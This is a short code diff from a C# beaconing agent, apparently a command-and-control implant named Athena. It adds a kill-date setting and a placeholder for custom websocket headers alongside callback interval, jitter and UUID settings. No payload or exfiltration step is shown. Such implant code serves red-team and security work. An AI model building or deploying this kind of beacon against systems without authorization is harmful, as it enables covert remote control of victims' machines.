@@ -46,6 +46,8 @@ namespace Athena
             this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
             int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
             this.sleep = sleep;
+            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
+            this.killDate = kd;
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.uuid = "%UUID%";
@@ -61,6 +63,8 @@ namespace Athena
             {
                 this.ws.Options.SetRequestHeader("Host", this.hostHeader);
             }
+
+            //%CUSTOMHEADERS%
         }
         public async Task StartBeacon()
         {
